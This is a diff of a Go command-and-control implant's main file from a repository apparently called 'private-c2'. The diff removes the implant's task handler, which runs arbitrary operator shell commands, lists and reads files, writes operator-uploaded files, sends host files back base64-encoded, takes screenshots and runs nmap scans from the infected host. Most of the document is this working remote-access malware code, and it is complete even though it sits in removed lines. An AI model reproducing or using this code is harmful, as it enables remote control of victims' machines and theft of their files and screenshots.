@@ -3,7 +3,6 @@ package main
 import (
 	"context"
 	"crypto/tls"
-	"encoding/base64"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -12,17 +11,13 @@ import (
 	"math/rand"
 	"net"
 	"os"
-	"os/exec"
 	"os/signal"
 	"os/user"
 	"path/filepath"
 	"runtime"
-	"strings"
 	"syscall"
 	"time"
 
-	"github.com/azizbinmohammad/private-c2/implant/modules/nmap"
-	"github.com/azizbinmohammad/private-c2/implant/modules/screenshot"
 	"github.com/azizbinmohammad/private-c2/pkg/envelope"
 	"github.com/azizbinmohammad/private-c2/pkg/protocol"
 	"github.com/azizbinmohammad/private-c2/pkg/tlsutil"
@@ -87,109 +82,6 @@ func sleepWithJitter(interval time.Duration, jitter float64) {
 		actual = 0
 	}
 	time.Sleep(actual)
-}
-
-func executeShell(ctx context.Context, cmdStr string) (string, error) {
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.CommandContext(ctx, "cmd", "/c", cmdStr)
-	} else {
-		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", cmdStr)
-	}
-	out, err := cmd.CombinedOutput()
-	return string(out), err
-}
-
-func handleTask(ctx context.Context, task protocol.TaskWire) (string, error) {
-	switch task.Type {
-	case "shell":
-		return executeShell(ctx, task.Args)
-
-	case "ls":
-		dir := task.Args
-		if dir == "" {
-			dir = "."
-		}
-		entries, err := os.ReadDir(dir)
-		if err != nil {
-			return "", err
-		}
-		var sb strings.Builder
-		for _, e := range entries {
-			info, infoErr := e.Info()
-			if infoErr != nil {
-				sb.WriteString(fmt.Sprintf("%s\n", e.Name()))
-				continue
-			}
-			sb.WriteString(fmt.Sprintf("%s\t%d\t%s\n", info.Mode(), info.Size(), e.Name()))
-		}
-		return sb.String(), nil
-
-	case "pwd":
-		return os.Getwd()
-
-	case "cd":
-		if err := os.Chdir(task.Args); err != nil {
-			return "", err
-		}
-		return task.Args, nil
-
-	case "ps":
-		return executeShell(ctx, "ps aux")
-
-	case "cat":
-		data, err := os.ReadFile(task.Args)
-		if err != nil {
-			return "", err
-		}
-		return string(data), nil
-
-	case "upload":
-		// Args format: "base64data|/path/to/file"
-		parts := strings.SplitN(task.Args, "|", 2)
-		if len(parts) != 2 {
-			return "", fmt.Errorf("upload args must be 'base64data|filepath'")
-		}
-		decoded, err := base64.StdEncoding.DecodeString(parts[0])
-		if err != nil {
-			return "", fmt.Errorf("decode base64: %w", err)
-		}
-		if err := os.WriteFile(parts[1], decoded, 0644); err != nil {
-			return "", err
-		}
-		return fmt.Sprintf("wrote %d bytes to %s", len(decoded), parts[1]), nil
-
-	case "download":
-		data, err := os.ReadFile(task.Args)
-		if err != nil {
-			return "", err
-		}
-		return base64.StdEncoding.EncodeToString(data), nil
-
-	case "screenshot":
-		result, err := screenshot.Execute(ctx, []byte(task.Args))
-		if err != nil {
-			return "", err
-		}
-		return base64.StdEncoding.EncodeToString(result), nil
-
-	case "nmap":
-		// Scans run on this host, so nmap has to be installed here. Empty args
-		// is the operator asking whether it is.
-		return nmap.Execute(ctx, task.Args)
-
-	case "scan":
-		// Structured port/service/vulnerability scan. Unlike "nmap" this
-		// returns JSON rather than nmap's own text, so the operator surfaces
-		// can render services and findings as tables. Args is a JSON
-		// {"target","profile"}; the result is returned even alongside an error,
-		// because a scan cut short at its deadline still found what it found.
-		out, err := nmap.Scan(ctx, []byte(task.Args))
-		return string(out), err
-
-	default:
-		return "", fmt.Errorf("unknown task type: %s", task.Type)
-	}
 }
 
 func connect(serverAddr string, tlsConfig *tls.Config) (net.Conn, error) {
